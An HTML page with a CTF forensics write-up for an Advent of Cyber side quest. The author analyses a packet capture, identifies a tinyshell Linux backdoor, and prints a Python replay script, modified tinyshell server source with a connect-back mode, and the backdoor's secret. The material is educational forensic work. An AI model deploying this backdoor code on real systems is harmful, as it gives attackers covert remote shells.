@@ -1,0 +1,431 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Advent of Cyber Side Quest - T1</title>
+    <link href="/index.css" rel="stylesheet" />
+  </head>
+
+  <body>
+    <article><div><h1>Advent of Cyber Side Quest - T1</h1><h2>Operation Tiny Frostbite</h2><h3>Wireshark</h3><h4>Website Password</h4><p>Using the password from the L1 Keycard, we are able to extract the zip and obtain the .pcap file that contains many logs. We are able to open the file in wireshark and we are now instructed to locate a password that the attacker used to register on the site.</p><p>In order to find the password we need to narrow down the number of packets that we have, to do this we will narrow down to HTTP requests because we know the password was used on a website:</p><p><img src="/images/Pasted image 20241207204217.png" alt="Pasted image 20241207204217.png"></img></p><p>Here we see an interesting number of packets that look like it is trying to bruteforce the available directories, by looking into one request we can confirm the use of gobuster here:</p><p><img src="/images/Pasted image 20241207204554.png" alt="Pasted image 20241207204554.png"></img></p><p>However, this is not what we are trying to find, we need to find a way to narrow down even more, considering what we are trying to find, we understand that if a user were to register to a site using HTTP it will need to pass the password using a HTTP POST request to narrow it down in wireshark we can use this filter:</p><p><img src="/images/Pasted image 20241207204847.png" alt="Pasted image 20241207204847.png"></img></p><p>Now we have narrowed down our requests just to 13 packets to look through, heading to the register.php request we see:</p><p><img src="/images/Pasted image 20241207205010.png" alt="Pasted image 20241207205010.png"></img></p><h4>Attacker Capture Password</h4><p>To find the password that the attacker captured we can see that it is also present in the post requests:</p><p><img src="/images/Pasted image 20241207205924.png" alt="Pasted image 20241207205924.png"></img></p><p>Here we see that the attacker spoofed sending the password to himself from which then he was able to use the password:</p><p><img src="/images/Pasted image 20241207210034.png" alt="Pasted image 20241207210034.png"></img></p><h4>Zip Password</h4><p>In order to find the zip file that was passed to the attacker we can use the magic numbers found in the first few hex bits of a zip file which are:</p><p><img src="/images/Pasted image 20241207232627.png" alt="Pasted image 20241207232627.png"></img></p><p>Looking at the TCP stream received from this we are able to find a few packets related to the zip file we are finding, by following the TCP Stream:</p><p><img src="/images/Pasted image 20241207232933.png" alt="Pasted image 20241207232933.png"></img></p><p>Now we are able to download this zip file as raw as shown here:</p><p><img src="/images/Pasted image 20241207233204.png" alt="Pasted image 20241207233204.png"></img></p><p>Save this as a .zip file. Here we see that this zip file contains a .sql file but we need a password to access the file, I believe just trying to crack the file would be difficult and probably not the intended solution.</p><p><img src="/images/Pasted image 20241207233822.png" alt="Pasted image 20241207233822.png"></img></p><p>So instead we will head back into wireshark to try and find something in relation to a password. Instead of a password we seemed to find a different type of file. Upon the 'getting' of the /FF endpoint we see a file in the follow TCP stream where we get an ELF executable file:</p><p><img src="/images/Pasted image 20241208004546.png" alt="Pasted image 20241208004546.png"></img></p><p>Now if we download this ELF file, we should be able to run this file to somehow find the password for the zip file.</p><p>Additionally, we also found another ELF file which we also downloaded named exp<i>file</i>credential.</p><p>Now looking at the strings present in the ELF files we find some interesting strings: exp<i>file</i>credential:</p><p><img src="/images/Pasted image 20241214235618.png" alt="Pasted image 20241214235618.png"></img></p><p>ff.elf:</p><p><img src="/images/Pasted image 20241214233918.png" alt="Pasted image 20241214233918.png"></img></p><p><img src="/images/Pasted image 20241214234111.png" alt="Pasted image 20241214234111.png"></img></p><p><img src="/images/Pasted image 20241214235205.png" alt="Pasted image 20241214235205.png"></img></p><p>Looking at the interesting strings available to us, two of them look like possible passwords, checking them, we discover they are not. Considering both applications, we could possibly use these items to try and decode the encrypted code that may indicate what commands the attacker was running and what passwords they may have typed for the zip file as captured in wireshark.  But first we will try and search on github for any use of the above text, because there is a good chance the attacker had used a program that was premade. So by searching such keywords on github we seem to have found something:</p><p><img src="/images/Pasted image 20241215012258.png" alt="Pasted image 20241215012258.png"></img></p><p>The first file seems to point to a CVE that exploits linux kernels, however, without access to the Linux kernel itself we will not be able to run or probably obtain anything because it is not going over the network thus not being captured by wireshark.  We will now search for the next file, by looking and searching for the usage in GitHub we seem to have a match:</p><p><img src="/images/Pasted image 20241215013018.png" alt="Pasted image 20241215013018.png"></img></p><p>This is a Linux backdoor using tinyshell, essentially by running a server on the vulnerable application, we are able to connect to it using the client and communicate using regular commands on the attacking machine. These commands are encrypted and can be run through a port that you choose, these encrypted commands are run over the network so, these would be captured by wireshark.</p><p>Thus we will have to look into the tinyshell software and attempt to exploit it, by connecting to the server and passing it the encrypted commands from wireshark, then receiving and outputting the decrypted commands through the server.</p><p>To do this, the easiest method would be to make use of python's socket programming functionality and connect to the socket that the server is running on, then we can pass the encrypted commands and then on the server side, we can modify the current server code to print out the decrypted commands.</p><p>First we will need the commands from wireshark to find them, we need to find client side traffic that is all on a single port. We can find that here under port 9001, by following the tcp stream we get (output as YAML for easy understanding):</p><p><img src="/images/Pasted image 20241215015103.png" alt="Pasted image 20241215015103.png"></img></p><p>What we need to extract is the red data section, which is the encrypted commands further encoded using base64 to make it easier for me to see, analyse and understand. So additionally in the python script we can make use of the base64 decoder to decode the commands then send them to the server. Here is the finished python script including all of the commands that we need to send:</p><pre><code>import socket
+import base64
+import sys
+import fcntl, os
+import select
+
+def read_from_socket(sock):
+    data = b""
+    while True:
+        chunk = sock.recv(1)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect(('127.0.0.1', 9001))
+
+def process_data(data):
+    try:
+        decoded_data = base64.b64decode(data)#, '-_')
+        print("Sending(", len(decoded_data),"): ", " ".join(hex(n) for n in decoded_data))
+        client_socket.sendall(decoded_data)
+        return ""
+
+    except Exception as e:
+        return f"Error: {e}"
+
+frames = [
+        "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"
+]
+
+if __name__ == "__main__":
+    i = 0
+    for msg in frames:
+        result = process_data(msg)
+        print("< ", result)
+</code></pre><p>We also need to edit the tshd.c file of the tinyshell software to make sure that it does not exit into the background thus not allowing us to print anything and we also need it to print out every command it receives. This is the edited file:</p><pre><code>/*
+ * Tiny SHell version 0.6 - server side,
+ * by Christophe Devine <devine@cr0.net>;
+ * this program is licensed under the GPL.
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
+#include <termios.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <netdb.h>
+
+/* PTY support requires system-specific #include */
+
+#if defined LINUX || defined OSF
+  #include <pty.h>
+#else
+#if defined FREEBSD
+  #include <libutil.h>
+#else
+#if defined OPENBSD
+  #include <util.h>
+#else
+#if defined SUNOS || defined HPUX
+  #include <sys/stropts.h>
+#else
+#if ! defined CYGWIN && ! defined IRIX
+  #error Undefined host system
+#endif
+#endif
+#endif
+#endif
+#endif
+
+#include "tsh.h"
+#include "pel.h"
+
+unsigned char message[BUFSIZE + 1];
+extern char *optarg;
+extern int optind;
+
+/* function declaration */
+
+int process_client( int client );
+int tshd_get_file( int client );
+int tshd_put_file( int client );
+int tshd_runshell( int client );
+
+void usage(char *argv0)
+{
+    fprintf(stderr, "Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
+    exit(1);
+}
+
+
+/* program entry point */
+
+
+int main( int argc, char **argv )
+{
+    int ret, pid;
+    socklen_t n;
+    int opt;
+
+    int client, server;
+    struct sockaddr_in server_addr;
+    struct sockaddr_in client_addr;
+    struct hostent *client_host;
+
+    while ((opt = getopt(argc, argv, "s:p:c::")) != -1) {
+        switch (opt) {
+            case 'p':
+                server_port=atoi(optarg); /* We hope ... */
+                if (!server_port) usage(*argv);
+                break;
+            case 's':
+                secret=optarg; /* We hope ... */
+                break;
+			case 'c':
+				if (optarg == NULL) {
+					cb_host = CONNECT_BACK_HOST;
+				} else {
+					cb_host = optarg;
+				}
+				break;
+            default: /* '?' */
+                usage(*argv);
+                break;
+        }
+    }
+
+	if (cb_host == NULL) {
+    	/* create a socket */
+
+	    server = socket( AF_INET, SOCK_STREAM, 0 );
+
+	    if( server < 0 )
+	    {
+	        perror("socket");
+	        return( 3 );
+	    }
+
+	    /* bind the server on the port the client will connect to */    
+
+	    n = 1;
+
+	    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
+                      (void *) &n, sizeof( n ) );
+
+	    if( ret < 0 )
+	    {
+	        perror("setsockopt");
+	        return( 4 );
+	    }
+
+	    server_addr.sin_family      = AF_INET;
+	    server_addr.sin_port        = htons( server_port );
+	    server_addr.sin_addr.s_addr = INADDR_ANY;
+
+	    ret = bind( server, (struct sockaddr *) &server_addr,
+                sizeof( server_addr ) );
+
+	    if( ret < 0 )
+	    {
+	        perror("bind");
+	        return( 5 );
+	    }
+
+	    if( listen( server, 5 ) < 0 )
+	    {
+	        perror("listen");
+	        return( 6 );
+	    }
+
+	    while( 1 )
+	    {
+    	    /* wait for inboud connections */
+
+        	n = sizeof( client_addr );
+
+	        client = accept( server, (struct sockaddr *)
+                         &client_addr, &n );
+
+    	    if( client < 0 )
+        	{
+            	perror("accept");
+	            return( 7 );
+	        }
+
+			ret = process_client(client);
+
+			if (ret == 1) {
+				continue;
+			}
+
+	        return( ret );
+		}
+	} else {
+		/* -c specfieid, connect back mode */
+
+	    while( 1 )
+	    {
+	        sleep( CONNECT_BACK_DELAY );
+
+	        /* create a socket */
+
+	        client = socket( AF_INET, SOCK_STREAM, 0 );
+
+	        if( client < 0 )
+	        {
+	            continue;
+	        }
+
+	        /* resolve the client hostname */
+
+	        client_host = gethostbyname( cb_host );
+
+	        if( client_host == NULL )
+	        {
+	            continue;
+	        }
+
+	        memcpy( (void *) &client_addr.sin_addr,
+	                (void *) client_host->h_addr,
+	                client_host->h_length );
+
+	        client_addr.sin_family = AF_INET;
+	        client_addr.sin_port   = htons( server_port );
+
+	        /* try to connect back to the client */
+
+	        ret = connect( client, (struct sockaddr *) &client_addr,
+	                       sizeof( client_addr ) );
+
+	        if( ret < 0 )
+	        {
+	            close( client );
+	            continue;
+	        }
+
+	        ret = process_client(client);
+			if (ret == 1) {
+				continue;
+			}
+
+			return( ret );
+	    }
+	}
+
+    /* not reached */
+
+    return( 13 );
+}
+
+int process_client(int client) {
+
+	int pid, ret, len;
+
+    /* fork a child to handle the connection */
+
+    pid = fork();
+
+    if( pid < 0 )
+    {
+        close( client );
+        return 1;
+    }
+
+    if( pid != 0 )
+    {
+        waitpid( pid, NULL, 0 );
+        close( client );
+    	return 1;
+    }
+
+    /* the child forks and then exits so that the grand-child's
+     * father becomes init (this to avoid becoming a zombie) */
+
+    pid = fork();
+
+    if( pid < 0 )
+    {
+        return( 8 );
+    }
+
+    if( pid != 0 )
+    {
+    	return( 9 );
+    }
+
+    /* setup the packet encryption layer */
+
+    alarm( 3 );
+
+    ret = pel_server_init( client, secret );
+
+    if( ret != PEL_SUCCESS )
+    {
+		shutdown( client, 2 );
+    	return( 10 );
+    }
+
+    alarm( 0 );
+
+    /* get the action requested by the client */
+
+    ret = pel_recv_msg( client, message, &len );
+
+    if( ret != PEL_SUCCESS || len != 1 )
+    {
+        shutdown( client, 2 );
+        return( 11 );
+    }
+
+    /* howdy */
+    while ( 1 ){
+    
+		printf("Received message: %s\n", message);    
+		ret = pel_recv_msg( client, message, &len );
+	
+    }
+    
+	
+
+    shutdown( client, 2 );
+	return( ret );
+}
+
+</code></pre><p>Essentially, in the server file we need to remove the forking commands which sends the process to the background so now when we run the server. We also need to edit the tsh.h file because the server file uses the variables within this file, specifically the secret variable. Let's make use of the SuP3RSeCrEt we found previously, let's also make the port number 9001 to make it as similar as possible to the original wireshark capture of the attacker:</p><pre><code>#ifndef _TSH_H
+#define _TSH_H
+
+char *secret = "SuP3RSeCrEt";
+char *cb_host = NULL;
+
+#define SERVER_PORT 9001
+short int server_port = SERVER_PORT;
+
+#define CONNECT_BACK_HOST  "localhost"
+#define CONNECT_BACK_DELAY 5
+
+#define GET_FILE 1
+#define PUT_FILE 2
+#define RUNSHELL 3
+
+#endif /* tsh.h */
+</code></pre><p>Now by running the tshd server and then running the python file we receive a bunch of commands:</p><p><img src="/images/Pasted image 20241215023418.png" alt="Pasted image 20241215023418.png"></img></p><p>Here we find the password for the zip file.</p><h4>McSkidy's Password</h4><p>After unzipping the zip file we receive a elves.sql file. In order to find the password within the sql file that we receive, all we have to do is print out the file and we easily find the password:</p><p><img src="/images/Pasted image 20241215023848.png" alt="Pasted image 20241215023848.png"></img></p><p><img src="/images/Pasted image 20241215024044.png" alt="Pasted image 20241215024044.png"></img></p><p><img src="/images/Pasted image 20241215024109.png" alt="Pasted image 20241215024109.png"></img></p></div></article>
+    <a href="/">Back to Home</a>
+  </body>
+  <hr>
+  <footer>
+    Made By Rishan
+  </footer>
+</html>
